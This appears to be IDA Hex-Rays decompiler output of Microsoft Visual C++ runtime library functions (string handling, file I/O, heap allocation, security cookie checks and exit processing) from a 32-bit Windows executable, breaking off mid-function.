//----- (00401A77) --------------------------------------------------------
int __thiscall std__bad_alloc__bad_alloc(int this, int a2)
{
  int v3; // esi@1

  v3 = this;
  exception__exception(a2);
  *(_DWORD *)v3 = &std__bad_alloc___vftable_;
  return v3;
}

//----- (00401A8F) --------------------------------------------------------
#error "401AEF: invalid basic block (funcsize=26)"

//----- (00401AF0) --------------------------------------------------------
#error "401AF5: invalid basic block (funcsize=3)"

//----- (00401B00) --------------------------------------------------------
int __cdecl strcat(int a1, int a2)
{
  int v2; // ecx@1
  int v3; // eax@5
  int v4; // edi@10
  int v5; // ecx@14
  int v6; // edx@15
  int result; // eax@25
  char v8; // al@2
  int v9; // eax@4
  int v10; // eax@19

  v2 = a1;
  if ( a1 & 3 )
  {
    while ( 1 )
    {
      v8 = *(_BYTE *)v2++;
      if ( !v8 )
        break;
      if ( !(v2 & 3) )
        goto LABEL_4;
    }
LABEL_10:
    v4 = v2 - 1;
  }
  else
  {
    while ( 1 )
    {
      do
      {
LABEL_4:
        v9 = (*(_DWORD *)v2 + 2130640639) ^ ~*(_DWORD *)v2;
        v2 += 4;
      }
      while ( !(v9 & 0x81010100) );
      v3 = *(_DWORD *)(v2 - 4);
      if ( !(_BYTE)v3 )
        break;
      if ( !BYTE1(v3) )
      {
        v4 = v2 - 3;
        goto LABEL_14;
      }
      if ( !(v3 & 0xFF0000) )
      {
        v4 = v2 - 2;
        goto LABEL_14;
      }
      if ( !(v3 & 0xFF000000) )
        goto LABEL_10;
    }
    v4 = v2 - 4;
  }
LABEL_14:
  v5 = a2;
  if ( !(a2 & 3) )
    goto LABEL_19;
  while ( 1 )
  {
    LOBYTE(v6) = *(_BYTE *)v5++;
    if ( !(_BYTE)v6 )
      break;
    *(_BYTE *)v4++ = v6;
    if ( !(v5 & 3) )
    {
      while ( 1 )
      {
LABEL_19:
        v10 = (*(_DWORD *)v5 + 2130640639) ^ ~*(_DWORD *)v5;
        v6 = *(_DWORD *)v5;
        v5 += 4;
        if ( v10 & 0x81010100 )
        {
          if ( !(_BYTE)v6 )
            goto LABEL_28;
          if ( !BYTE1(v6) )
          {
            *(_WORD *)v4 = v6;
            return a1;
          }
          if ( !(v6 & 0xFF0000) )
          {
            *(_WORD *)v4 = v6;
            result = a1;
            *(_BYTE *)(v4 + 2) = 0;
            return result;
          }
          if ( !(v6 & 0xFF000000) )
          {
            *(_DWORD *)v4 = v6;
            return a1;
          }
        }
        *(_DWORD *)v4 = v6;
        v4 += 4;
      }
    }
  }
LABEL_28:
  *(_BYTE *)v4 = v6;
  return a1;
}

//----- (00401BE8) --------------------------------------------------------
void __cdecl report_failure()
{
  _security_error_handler(1, 0);
}

//----- (00401C05) --------------------------------------------------------
signed int __cdecl sub_401C05()
{
  return 1;
}

//----- (00401C09) --------------------------------------------------------
void __usercall sub_401C09(int a1<ebp>)
{
  *(_DWORD *)(a1 - 4) = -1;
  ExitProcess(3u);
}

//----- (00401C19) --------------------------------------------------------
void __fastcall _security_check_cookie(int a1)
{
  if ( a1 != _security_cookie )
    report_failure();
}

//----- (00401C6D) --------------------------------------------------------
signed int __cdecl fclose(int a1)
{
  int v1; // eax@1
  signed int v2; // edi@1
  int v3; // esi@1
  signed int result; // eax@2

  v3 = a1;
  v1 = *(_DWORD *)(a1 + 12);
  v2 = -1;
  if ( v1 & 0x40 )
  {
    result = -1;
  }
  else
  {
    if ( v1 & 0x83 )
    {
      v2 = flush(a1);
      freebuf(v3);
      if ( close(*(_DWORD *)(v3 + 16)) >= 0 )
      {
        if ( *(_DWORD *)(v3 + 28) )
        {
          free(*(_DWORD *)(v3 + 28));
          *(_DWORD *)(v3 + 28) = 0;
        }
      }
      else
      {
        v2 = -1;
      }
    }
    result = v2;
  }
  *(_DWORD *)(v3 + 12) = 0;
  return result;
}

//----- (00401CC3) --------------------------------------------------------
int __cdecl fgets(int a1, int a2, int a3)
{
  int v3; // ebx@1
  int v4; // edi@1
  int result; // eax@2
  int v6; // esi@4
  signed int v7; // eax@6
  char v8; // zf@3
  char v9; // sf@5
  char v10; // zf@10

  v3 = a1;
  v4 = a1;
  if ( a2 > 0 )
  {
    v8 = a2-- == 1;
    if ( v8 )
      goto LABEL_11;
    v6 = a3;
    while ( 1 )
    {
      v9 = *(_DWORD *)(v6 + 4)-- < 1;
      if ( v9 )
        v7 = filbuf(v6);
      else
        v7 = *(_BYTE *)*(_DWORD *)v6++;
      if ( v7 == -1 )
        break;
      *(_BYTE *)v4++ = v7;
      if ( (_BYTE)v7 != 10 )
      {
        v10 = a2-- == 1;
        if ( !v10 )
          continue;
      }
      goto LABEL_11;
    }
    if ( v4 != a1 )
LABEL_11:
      *(_BYTE *)v4 = 0;
    else
      v3 = 0;
    result = v3;
  }
  else
  {
    result = 0;
  }
  return result;
}

//----- (00401D1A) --------------------------------------------------------
int __cdecl fsopen(char *a1, int a2, int a3)
{
  int result; // eax@1

  result = getstream();
  if ( result )
    result = openfile(a1, a2, a3, result);
  else
    errno = 24;
  return result;
}

//----- (00401D44) --------------------------------------------------------
int __cdecl fopen(char *a1, int a2)
{
  return fsopen(a1, a2, 64);
}

//----- (00401D60) --------------------------------------------------------
int __cdecl strlen(int a1)
{
  int v1; // ecx@1
  int v2; // eax@5
  int result; // eax@10
  char v4; // al@2
  int v5; // eax@4

  v1 = a1;
  if ( a1 & 3 )
  {
    while ( 1 )
    {
      v4 = *(_BYTE *)v1++;
      if ( !v4 )
        break;
      if ( !(v1 & 3) )
        goto LABEL_4;
    }
LABEL_10:
    result = v1 - 1 - a1;
  }
  else
  {
    while ( 1 )
    {
      do
      {
LABEL_4:
        v5 = (*(_DWORD *)v1 + 2130640639) ^ ~*(_DWORD *)v1;
        v1 += 4;
      }
      while ( !(v5 & 0x81010100) );
      v2 = *(_DWORD *)(v1 - 4);
      if ( !(_BYTE)v2 )
        break;
      if ( !BYTE1(v2) )
        return v1 - 3 - a1;
      if ( !(v2 & 0xFF0000) )
        return v1 - 2 - a1;
      if ( !(v2 & 0xFF000000) )
        goto LABEL_10;
    }
    result = v1 - 4 - a1;
  }
  return result;
}

//----- (00401DEB) --------------------------------------------------------
signed int __cdecl system(int a1)
{
  int v1; // eax@1
  signed int result; // eax@3
  char *v3; // [sp+4h] [bp-10h]@1
  char *v4; // [sp+8h] [bp-Ch]@5
  int v5; // [sp+Ch] [bp-8h]@5
  int v6; // [sp+10h] [bp-4h]@5

  v1 = getenv((int)"COMSPEC");
  v3 = (char *)v1;
  if ( a1 )
  {
    v4 = "/c";
    v5 = a1;
    v6 = 0;
    if ( !v1
      || (result = spawnve(0, (const char *)v1, (const char *const *)&v3, 0), result == -1)
      && (errno == 2 || errno == 13) )
    {
      v3 = "command.com";
      if ( !(BYTE1(osver) & 0x80) )
        v3 = "cmd.exe";
      result = spawnvpe(0, v3, (const char *const *)&v3, 0);
    }
  }
  else
  {
    if ( v1 )
      result = access((const char *)v1, 0) == 0;
    else
      result = 0;
  }
  return result;
}

//----- (00401E86) --------------------------------------------------------
int __cdecl sprintf(int a1, int a2, char a3)
{
  int v3; // edi@1
  int v5; // esi@1
  char v6; // sf@2
  signed int v7; // [sp+Ch] [bp-1Ch]@1
  signed int v8; // [sp+14h] [bp-14h]@1
  int v9; // [sp+10h] [bp-18h]@1
  int v10; // [sp+8h] [bp-20h]@1

  v5 = a1;
  v7 = 2147483647;
  v8 = 66;
  v9 = a1;
  v10 = a1;
  v3 = output((int)&v10, a2, (int)&a3);
  if ( v5 )
  {
    v6 = v7-- < 1;
    if ( v6 )
      flsbuf(0, (int)&v10);
    else
      *(_BYTE *)v10 = 0;
  }
  return v3;
}

//----- (00401EDE) --------------------------------------------------------
int __cdecl printf(int a1, char a2)
{
  int v3; // edi@1
  int v4; // ebx@1

  v3 = stbuf((int)&unk_40B100);
  v4 = output((int)&unk_40B100, a1, (int)&a2);
  ftbuf(v3, (int)&unk_40B100);
  return v4;
}

//----- (00401F0F) --------------------------------------------------------
int __thiscall atol(int this, int *a2)
{
  int *v2; // esi@1
  signed int v3; // edx@4
  signed int v4; // ecx@4
  int v5; // esi@4
  int result; // eax@7
  int v7; // ecx@10
  int v8; // eax@3
  int v9; // ST00_4@3

  v2 = a2;
  while ( 1 )
  {
    v8 = ismbcspace(this, *(_BYTE *)v2);
    this = v9;
    if ( !v8 )
      break;
    v2 = (int *)((char *)v2 + 1);
  }
  v4 = *(_BYTE *)v2;
  v5 = (int)((char *)v2 + 1);
  v3 = v4;
  if ( v4 == 45 || v4 == 43 )
    v4 = *(_BYTE *)v5++;
  result = 0;
  while ( 1 )
  {
    if ( v4 < 48 || v4 > 57 )
      v7 = -1;
    else
      v7 = v4 - 48;
    if ( v7 == -1 )
      break;
    result = v7 + 10 * result;
    v4 = *(_BYTE *)v5++;
  }
  if ( v3 == 45 )
    result = -result;
  return result;
}

//----- (00401F6C) --------------------------------------------------------
int __cdecl amsg_exit(DWORD NumberOfBytesWritten)
{
  if ( _error_mode != 2 )
    FF_MSGBANNER();
  NMSG_WRITE(NumberOfBytesWritten);
  return aexit_rtn(255);
}

//----- (00402158) --------------------------------------------------------
void *__cdecl heap_alloc(DWORD dwBytes)
{
  DWORD v1; // esi@1
  void *result; // eax@3

  v1 = dwBytes;
  if ( _active_heap != 3 || dwBytes > _sbh_threshold || (result = (void *)_sbh_alloc_block(dwBytes), !result) )
  {
    if ( !v1 )
      ++v1;
    if ( _active_heap != 1 )
      v1 = (v1 + 15) & 0xFFFFFFF0;
    result = HeapAlloc(crtheap, 0, v1);
  }
  return result;
}

//----- (0040219E) --------------------------------------------------------
int __cdecl nh_malloc(DWORD dwBytes, int a2)
{
  int result; // eax@2

  if ( dwBytes > 0xFFFFFFE0 )
  {
LABEL_5:
    result = 0;
  }
  else
  {
    while ( 1 )
    {
      result = (int)heap_alloc(dwBytes);
      if ( result )
        break;
      if ( a2 == result )
        break;
      if ( !callnewh(dwBytes) )
        goto LABEL_5;
    }
  }
  return result;
}

//----- (004021CA) --------------------------------------------------------
int __cdecl malloc(DWORD dwBytes)
{
  return nh_malloc(dwBytes, newmode);
}

//----- (004021DC) --------------------------------------------------------
bool __cdecl callnewh(int a1)
{
  return pnhHeap && pnhHeap(a1);
}

//----- (004021F7) --------------------------------------------------------
int __thiscall exception__exception(int this, int *a2)
{
  int v2; // eax@1
  int v3; // esi@1
  int *v5; // edi@1
  int v6; // eax@1

  v5 = a2;
  v3 = this;
  *(_DWORD *)this = &exception___vftable_;
  v6 = strlen(*v5);
  v2 = malloc(v6 + 1);
  *(_DWORD *)(v3 + 4) = v2;
  if ( v2 )
    strcpy(v2);
  *(_DWORD *)(v3 + 8) = 1;
  return v3;
}

//----- (0040227E) --------------------------------------------------------
void __fastcall exception___exception(int a1)
{
  char v1; // zf@1

  v1 = *(_DWORD *)(a1 + 8) == 0;
  *(_DWORD *)a1 = &exception___vftable_;
  if ( !v1 )
    free(*(_DWORD *)(a1 + 4));
}

//----- (00402294) --------------------------------------------------------
char *__fastcall exception__what(int a1)
{
  char *result; // eax@1

  result = *(char **)(a1 + 4);
  if ( !result )
    result = "Unknown exception";
  return result;
}

//----- (004022A1) --------------------------------------------------------
int __thiscall exception___scalar_deleting_destructor_(int this, char a2)
{
  int v2; // esi@1

  v2 = this;
  exception___exception(this);
  if ( a2 & 1 )
    operator_delete();
  return v2;
}

//----- (004022BD) --------------------------------------------------------
void __fastcall type_info___type_info(int a1)
{
  int v1; // ecx@1

  *(_DWORD *)a1 = &type_info___vftable_;
  v1 = *(_DWORD *)(a1 + 4);
  if ( v1 )
    free(v1);
}

//----- (004022D2) --------------------------------------------------------
int __thiscall type_info___scalar_deleting_destructor_(int this, char a2)
{
  int v2; // esi@1

  v2 = this;
  type_info___type_info(this);
  if ( a2 & 1 )
    operator_delete();
  return v2;
}

//----- (004022F3) --------------------------------------------------------
_onexit_t __cdecl onexit(_onexit_t a1)
{
  DWORD v1; // eax@1
  int v2; // ecx@1
  DWORD v3; // esi@1
  signed int v4; // ecx@2
  _onexit_t result; // eax@4
  signed int v6; // ecx@7

  v1 = msize(_onexitbegin);
  v2 = _onexitend;
  v3 = v1;
  if ( v1 >= _onexitend - (_DWORD)_onexitbegin + 4 )
    goto LABEL_8;
  v4 = 2048;
  if ( v1 < 0x800 )
    v4 = v1;
  result = (_onexit_t)realloc((LPVOID)_onexitbegin, v1 + v4);
  if ( result || (result = (_onexit_t)realloc((LPVOID)_onexitbegin, v3 + 16), result) )
  {
    v6 = _onexitend - (_DWORD)_onexitbegin;
    _onexitbegin = result;
    v2 = (int)((char *)result + 4 * (v6 >> 2));
    _onexitend = v2;
LABEL_8:
    result = a1;
    *(_DWORD *)v2 = a1;
    _onexitend += 4;
  }
  return result;
}

//----- (00402375) --------------------------------------------------------
int __cdecl atexit(_onexit_t a1)
{
  return (onexit(a1) != 0) - 1;
}

//----- (00402387) --------------------------------------------------------
signed int __cdecl _onexitinit()
{
  int v0; // eax@1
  signed int result; // eax@2

  v0 = malloc(0x80u);
  _onexitbegin = (LPCVOID)v0;
  if ( v0 )
  {
    *(_DWORD *)v0 = 0;
    _onexitend = (int)_onexitbegin;
    result = 0;
  }
  else
  {
    result = 24;
  }
  return result;
}

//----- (004023AF) --------------------------------------------------------
void __stdcall CxxThrowException(int a1, int a2)
{
  DWORD dwExceptionCode; // [sp+8h] [bp-20h]@1
  int v3; // [sp+20h] [bp-8h]@1
  int v4; // [sp+24h] [bp-4h]@1
  DWORD dwExceptionFlags; // [sp+Ch] [bp-1Ch]@1
  DWORD nNumberOfArguments; // [sp+18h] [bp-10h]@1
  DWORD Arguments; // [sp+1Ch] [bp-Ch]@1

  memcpy(&dwExceptionCode, &unk_4096D4, 0x20u);
  v3 = a1;
  v4 = a2;
  RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, &Arguments);
}

//----- (004023E9) --------------------------------------------------------
unsigned __int32 __cdecl _security_init_cookie()
{
  unsigned __int32 result; // eax@1
  unsigned __int32 v1; // esi@3
  unsigned __int32 v2; // esi@3
  unsigned __int32 v3; // esi@3
  int v4; // esi@3
  struct _FILETIME SystemTimeAsFileTime; // [sp+8h] [bp-8h]@3
  LARGE_INTEGER PerformanceCount; // [sp+0h] [bp-10h]@3

  result = _security_cookie;
  if ( !_security_cookie || _security_cookie == -1153374642 )
  {
    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
    v1 = GetCurrentProcessId() ^ SystemTimeAsFileTime.dwLowDateTime ^ SystemTimeAsFileTime.dwHighDateTime;
    v2 = GetCurrentThreadId() ^ v1;
    v3 = GetTickCount() ^ v2;
    QueryPerformanceCounter(&PerformanceCount);
    result = PerformanceCount.LowPart ^ PerformanceCount.HighPart;
    v4 = PerformanceCount.LowPart ^ PerformanceCount.HighPart ^ v3;
    _security_cookie = v4;
    if ( !v4 )
      _security_cookie = -1153374642;
  }
  return result;
}

//----- (0040244F) --------------------------------------------------------
void __cdecl _security_error_handler(signed int a1, int a2)
{
  int v2; // ebx@8
  int v3; // eax@9
  CPPEH_RECORD ms_exc; // [sp+11Ch] [bp-18h]@2
  int v5; // [sp+Ch] [bp-128h]@4
  char v6; // [sp+114h] [bp-20h]@6
  CHAR Filename; // [sp+10h] [bp-124h]@6
  char v8; // [sp-21h] [bp-155h]@9
  int v9; // [sp+0h] [bp-134h]@10

  if ( user_handler )
  {
    user_handler(a1, a2);
    ms_exc.disabled = -1;
  }
  else
  {
    if ( a1 == 1 )
      v5 = (int)"A buffer overrun has been detected which has corrupted the program's\ninternal state.  The program cannot safely continue execution and must\nnow be terminated.\n";
    else
      v5 = (int)"A security error of unknown cause has been detected which has\ncorrupted the program's internal state.  The program cannot safely\ncontinue execution and must now be terminated.\n";
    v6 = 0;
    if ( !GetModuleFileNameA(0, &Filename, 0x104u) )
      strcpy(&Filename);
    v2 = (int)&Filename;
    if ( (unsigned int)(strlen((int)&Filename) + 11) > 0x3C )
    {
      v3 = strlen((int)&Filename);
      v2 = (int)(&v8 + v3);
      strncpy((int)(&v8 + v3), (int)"...", 3u);
    }
    strlen(v2);
    ms_exc.old_esp = (DWORD)&v9;
    strcpy(&v9);
    strcat((int)&v9, (int)"\n\n");
    strcat((int)&v9, (int)"Program: ");
    strcat((int)&v9, v2);
    strcat((int)&v9, (int)"\n\n");
    strcat((int)&v9, v5);
    _crtMessageBoxA((int)&v9, (int)"Microsoft Visual C++ Runtime Library", 73744);
  }
  exit(3);
}

//----- (004026ED) --------------------------------------------------------
void __cdecl free(int a1)
{
  int v1; // esi@1
  void *v2; // ST08_4@2
  int v3; // eax@3

  v1 = a1;
  if ( a1 )
  {
    v2 = (void *)a1;
    if ( _active_heap == 3 && (v3 = (int)_sbh_find_block(a1), v2 = (void *)v1, v3) )
      _sbh_free_block(v3, v1);
    else
      HeapFree(crtheap, 0, v2);
  }
}

//----- (00402725) --------------------------------------------------------
int __cdecl close(int a1)
{
  int v1; // edi@1
  int v2; // esi@2
  int v3; // ebp@8
  signed int v5; // ebp@6
  void *v6; // eax@7

  v1 = a1;
  if ( a1 < nhandle && (v2 = 8 * (a1 & 0x1F), *(_BYTE *)(_pioinfo[a1 >> 5] + v2 + 4) & 1) )
  {
    if ( get_osfhandle(a1) == -1
      || (v1 == 1 || v1 == 2) && (v5 = get_osfhandle(2u), get_osfhandle(1u) == v5)
      || (v6 = (void *)get_osfhandle(v1), CloseHandle(v6)) )
      v3 = 0;
    else
      v3 = GetLastError();
    free_osfhnd(v1);
    *(_BYTE *)(_pioinfo[v1 >> 5] + v2 + 4) = 0;
    if ( !v3 )
      return 0;
    dosmaperr(v3);
  }
  else
  {
    doserrno = 0;
    errno = 9;
  }
  return -1;
}

//----- (004027D8) --------------------------------------------------------
int __cdecl freebuf(int a1)
{
  int result; // eax@1
  int v2; // esi@1

  v2 = a1;
  result = *(_DWORD *)(a1 + 12);
  if ( result & 0x83 )
  {
    if ( result & 8 )
    {
      free(*(_DWORD *)(a1 + 8));
      *(_WORD *)(v2 + 12) &= 0xFBF7u;
      result = 0;
      *(_DWORD *)v2 = 0;
      *(_DWORD *)(v2 + 8) = 0;
      *(_DWORD *)(v2 + 4) = 0;
    }
  }
  return result;
}

//----- (00402803) --------------------------------------------------------
signed int __cdecl flush(int a1)
{
  int v1; // eax@1
  signed int v2; // ebx@1
  int v3; // esi@1
  int v4; // eax@3
  int v5; // edi@3
  int v6; // eax@5
  int v8; // eax@8

  v3 = a1;
  v1 = *(_DWORD *)(a1 + 12);
  v2 = 0;
  if ( (v1 & 3) == 2 )
  {
    if ( v1 & 0x108 )
    {
      v4 = *(_DWORD *)(a1 + 8);
      v5 = *(_DWORD *)a1 - v4;
      if ( v5 > 0 )
      {
        if ( write(*(_DWORD *)(a1 + 16), *(const void **)(a1 + 8), *(_DWORD *)a1 - v4) == v5 )
        {
          v6 = *(_DWORD *)(v3 + 12);
          if ( (_BYTE)v6 < 0 )
            *(_DWORD *)(v3 + 12) = v6 & 0xFFFFFFFD;
        }
        else
        {
          *(_DWORD *)(v3 + 12) |= 0x20u;
          v2 = -1;
        }
      }
    }
  }
  v8 = *(_DWORD *)(v3 + 8);
  *(_DWORD *)(v3 + 4) = 0;
  *(_DWORD *)v3 = v8;
  return v2;
}

//----- (00402860) --------------------------------------------------------
int __cdecl fflush(int a1)
{
  int v1; // esi@1
  int result; // eax@2

  v1 = a1;
  if ( a1 )
  {
    if ( flush(a1) )
    {
      result = -1;
    }
    else
    {
      if ( *(_BYTE *)(v1 + 13) & 0x40 )
        result = -(commit(*(_DWORD *)(v1 + 16)) != 0);
      else
        result = 0;
    }
  }
  else
  {
    result = flsall(a1);
  }
  return result;
}

//----- (0040289B) --------------------------------------------------------
int __cdecl flsall(int a1)
{
  int v1; // ebx@1
  int i; // edi@1
  int v3; // esi@1
  int v4; // eax@2
  int v5; // ecx@3
  int v6; // eax@9
  int result; // eax@12

  v3 = 0;
  v1 = 0;
  for ( i = 0; v3 < nstream; ++v3 )
  {
    v4 = *(_DWORD *)(_piob + 4 * v3);
    if ( v4 )
    {
      v5 = *(_DWORD *)(v4 + 12);
      if ( v5 & 0x83 )
      {
        if ( a1 == 1 )
        {
          if ( fflush(*(_DWORD *)(_piob + 4 * v3)) != -1 )
            ++v1;
        }
        else
        {
          if ( !a1 )
          {
            if ( v5 & 2 )
            {
              v6 = fflush(*(_DWORD *)(_piob + 4 * v3));
              if ( v6 == -1 )
                i |= v6;
            }
          }
        }
      }
    }
  }
  result = v1;
  if ( a1 != 1 )
    result = i;
  return result;
}

//----- (00402908) --------------------------------------------------------
int __cdecl flushall()
{
  return flsall(1);
}

//----- (00402911) --------------------------------------------------------
signed int __cdecl filbuf(int a1)
{
  int v1; // eax@1
  int v2; // esi@1
  int v3; // eax@8
  int v4; // edx@10
  signed int v5; // ecx@11
  int v6; // edi@12
  int v7; // ecx@17
  signed int result; // eax@20
  int v9; // eax@5
  signed int *v10; // ecx@20

  v2 = a1;
  v1 = *(_DWORD *)(a1 + 12);
  if ( !(v1 & 0x83) || v1 & 0x40 )
    return -1;
  if ( v1 & 2 )
  {
    *(_DWORD *)(a1 + 12) = v1 | 0x20;
    return -1;
  }
  v9 = v1 | 1;
  *(_DWORD *)(a1 + 12) = v9;
  if ( v9 & 0x10C )
    *(_DWORD *)a1 = *(_DWORD *)(a1 + 8);
  else
    getbuf(a1);
  v3 = read(*(_DWORD *)(v2 + 16), *(void **)(v2 + 8), *(_DWORD *)(v2 + 24));
  *(_DWORD *)(v2 + 4) = v3;
  if ( !v3 || v3 == -1 )
  {
    *(_DWORD *)(v2 + 12) |= (-(v3 != 0) & 0x10) + 16;
    *(_DWORD *)(v2 + 4) = 0;
    return -1;
  }
  v4 = *(_DWORD *)(v2 + 12);
  if ( !(v4 & 0x82) )
  {
    v5 = *(_DWORD *)(v2 + 16);
    if ( v5 == -1 )
      v6 = (int)&_badioinfo;
    else
      v6 = _pioinfo[v5 >> 5] + 8 * (v5 & 0x1F);
    if ( (*(_BYTE *)(v6 + 4) & 0x82) == -126 )
      *(_DWORD *)(v2 + 12) = v4 | 0x2000;
  }
  if ( *(_DWORD *)(v2 + 24) == 512 )
  {
    v7 = *(_DWORD *)(v2 + 12);
    if ( v7 & 8 )
    {
      if ( !(BYTE1(v7) & 4) )
        *(_DWORD *)(v2 + 24) = 4096;
    }
  }
  v10 = *(signed int **)v2;
  *(_DWORD *)(v2 + 4) = v3 - 1;
  result = *(_BYTE *)v10;
  *(_DWORD *)v2 = (char *)v10 + 1;
  return result;
}

//----- (004029EF) --------------------------------------------------------
int __cdecl openfile(char *a1, int a2, int a3, int a4)
{
  char v4; // al@1
  int v5; // edi@1
  signed int v6; // ecx@4
  int v7; // esi@5
  signed int v8; // edx@8
  int v9; // eax@10
  int v10; // eax@12
  int v11; // eax@13
  int v12; // eax@14
  int v13; // eax@26
  int v14; // eax@27
  int v15; // eax@28
  int v16; // ecx@40
  int result; // eax@41
  char v18; // zf@1
  int v19; // eax@40
  signed int v20; // [sp+Ch] [bp-8h]@1
  signed int v21; // [sp+10h] [bp-4h]@1

  v5 = a2;
  v4 = *(_BYTE *)a2;
  v18 = *(_BYTE *)a2 == 97;
  v20 = 0;
  v21 = 0;
  if ( v18 )
  {
    v6 = 265;
LABEL_7:
    v7 = commode | 2;
    goto LABEL_8;
  }
  if ( v4 != 114 )
  {
    if ( v4 != 119 )
      goto LABEL_41;
    v6 = 769;
    goto LABEL_7;
  }
  v6 = 0;
  v7 = commode | 1;
LABEL_8:
  v8 = 1;
  while ( 1 )
  {
    ++v5;
    LOBYTE(v9) = *(_BYTE *)v5;
    if ( !*(_BYTE *)v5 )
      break;
    if ( !v8 )
      break;
    v9 = (char)v9;
    if ( (char)v9 > 84 )
    {
      v13 = v9 - 98;
      if ( v13 )
      {
        v14 = v13 - 1;
        if ( v14 )
        {
          v15 = v14 - 11;
          if ( v15 )
          {
            if ( v15 != 6 || BYTE1(v6) & 0xC0 )
LABEL_35:
              v8 = 0;
            else
              v6 |= 0x4000u;
          }
          else
          {
            if ( v20 )
              goto LABEL_35;
            v20 = 1;
            v7 &= 0xFFFFBFFFu;
          }
        }
        else
        {
          if ( v20 )
            goto LABEL_35;
          v20 = 1;
          v7 |= 0x4000u;
        }
      }
      else
      {
        if ( BYTE1(v6) & 0xC0 )
          goto LABEL_35;
        v6 |= 0x8000u;
      }
    }
    else
    {
      if ( (char)v9 == 84 )
      {
        if ( v6 & 0x1000 )
          goto LABEL_35;
        v6 |= 0x1000u;
      }
      else
      {
        v10 = v9 - 43;
        if ( v10 )
        {
          v11 = v10 - 25;
          if ( v11 )
          {
            v12 = v11 - 14;
            if ( v12 )
            {
              if ( v12 != 1 || v21 )
                goto LABEL_35;
              v21 = 1;
              v6 |= 0x20u;
            }
            else
            {
              if ( v21 )
                goto LABEL_35;
              v21 = 1;
              v6 |= 0x10u;
            }
          }
          else
          {
            if ( v6 & 0x40 )
              goto LABEL_35;
            v6 |= 0x40u;
          }
        }
        else
        {
          if ( v6 & 2 )
            goto LABEL_35;
          v6 = v6 & 0xFFFFFFFE | 2;
          v7 = v7 & 0xFFFFFFFC | 0x80;
        }
      }
    }
  }
  v19 = sopen(a1, v6, a3, 420);
  v16 = v19;
  if ( v19 >= 0 )
  {
    result = a4;
    ++cflush;
    *(_DWORD *)(a4 + 12) = v7;
    *(_DWORD *)(a4 + 4) = 0;
    *(_DWORD *)a4 = 0;
    *(_DWORD *)(a4 + 8) = 0;
    *(_DWORD *)(a4 + 28) = 0;
    *(_DWORD *)(a4 + 16) = v16;
  }
  else
  {
LABEL_41:
    result = 0;
  }
  return result;
}

//----- (00402B57) --------------------------------------------------------
void __cdecl _crtExitProcess(UINT uExitCode)
{
  HMODULE v1; // eax@1
  FARPROC v2; // eax@2

  v1 = GetModuleHandleA("mscoree.dll");
  if ( v1 )
  {
    v2 = GetProcAddress(v1, "CorExitProcess");
    if ( v2 )
      ((int (__stdcall *)(_DWORD))v2)(uExitCode);
  }
  ExitProcess(uExitCode);
}

//----- (00402B87) --------------------------------------------------------
int __cdecl cinit(int a1)
{
  int result; // eax@3
  unsigned int v2; // esi@3
  unsigned int v3; // esi@9

  if ( FPinit )
    FPinit(a1);
  result = 0;
  v2 = (unsigned int)&_xi_a;
  if ( &_xi_a >= &_xi_z )
  {
LABEL_9:
    atexit((int (__cdecl *)())RTC_Terminate);
    v3 = (unsigned int)&_xc_a;
    if ( &_xc_a < &_xc_z )
    {
      do
      {
        if ( *(_DWORD *)v3 )
          (*(int (**)(void))v3)();
        v3 += 4;
      }
      while ( v3 < (unsigned int)&_xc_z );
    }
    result = 0;
  }
  else
  {
    while ( !result )
    {
      if ( *(_DWORD *)v2 )
        result = (*(int (**)(void))v2)();
      v2 += 4;
      if ( v2 >= (unsigned int)&_xi_z )
      {
        if ( result )
          return result;
        goto LABEL_9;
      }
    }
  }
  return result;
}

//----- (00402BF1) --------------------------------------------------------
int (*__cdecl doexit(UINT uExitCode, int a2, int a3))(void)
{
  char v3; // cf@5
  int v4; // eax@5
  int (*v5)(void); // eax@6
  unsigned int v6; // edi@10
  int (*result)(void); // eax@14
  unsigned int v8; // edi@14
  UINT v9; // ST04_4@2
  HANDLE v10; // eax@2

  if ( C_Exit_Done == 1 )
  {
    v9 = uExitCode;
    v10 = GetCurrentProcess();
    TerminateProcess(v10, v9);
  }
  C_Termination_Done = 1;
  exitflag = a3;
  if ( !a2 )
  {
    if ( _onexitbegin )
    {
      v4 = _onexitend - 4;
      v3 = _onexitend - 4 < (unsigned int)_onexitbegin;
      while ( 1 )
      {
        _onexitend = v4;
        if ( v3 )
          break;
        v5 = *(int (**)(void))v4;
        if ( v5 )
          v5();
        v4 = _onexitend - 4;
        v3 = _onexitend - 4 < (unsigned int)_onexitbegin;
      }
    }
    v6 = (unsigned int)&_xp_a;
    if ( &_xp_a < &_xp_z )
    {
      do
      {
        if ( *(_DWORD *)v6 )
          (*(int (**)(void))v6)();
        v6 += 4;
      }
      while ( v6 < (unsigned int)&_xp_z );
    }
  }
  result = (int (*)(void))&_xt_a;
  v8 = (unsigned int)&_xt_a;
  if ( &_xt_a < &_xt_z )
  {
    do
    {
      result = *(int (**)(void))v8;
      if ( *(_DWORD *)v8 )
        result = (int (*)(void))result();
      v8 += 4;
    }
    while ( v8 < (unsigned int)&_xt_z );
  }
  if ( !a3 )
  {
    C_Exit_Done = 1;
    _crtExitProcess(uExitCode);
  }
  return result;
}

//----- (00402CB2) --------------------------------------------------------
int (*__cdecl exit(UINT uExitCode))(void)
{
  return doexit(uExitCode, 0, 0);
}

//----- (00402CC3) --------------------------------------------------------
void __cdecl exit(int a1)
{
  doexit(a1, 1, 0);
}

//----- (00402CD4) --------------------------------------------------------
int (*__cdecl cexit())(void)
{
  return doexit(0, 0, 1);
}

//----- (00402CE3) --------------------------------------------------------
int (*__cdecl c_exit())(void)
{
  return doexit(0, 1, 1);
}

//----- (00402CF2) --------------------------------------------------------
int __cdecl getstream()
{
  int v0; // eax@1
  int v1; // esi@1
  int v2; // edx@2
  int v3; // edi@7
  int v5; // edi@7

  v1 = 0;
  v0 = 0;
  if ( nstream > 0 )
  {
    while ( 1 )
    {
      v2 = *(_DWORD *)(_piob + 4 * v0);
      if ( !v2 )
        break;
      if ( !(*(_BYTE *)(v2 + 12) & 0x83) )
      {
        v1 = *(_DWORD *)(_piob + 4 * v0);
        goto LABEL_9;
      }
      ++v0;
      if ( v0 >= nstream )
        return v1;
    }
    v5 = 4 * v0;
    *(_DWORD *)(4 * v0 + _piob) = malloc(0x20u);
    v3 = *(_DWORD *)(v5 + _piob);
    if ( !v3 )
      return v1;
    v1 = v3;
LABEL_9:
    if ( v1 )
    {
      *(_DWORD *)(v1 + 16) = -1;
      *(_DWORD *)(v1 + 4) = 0;
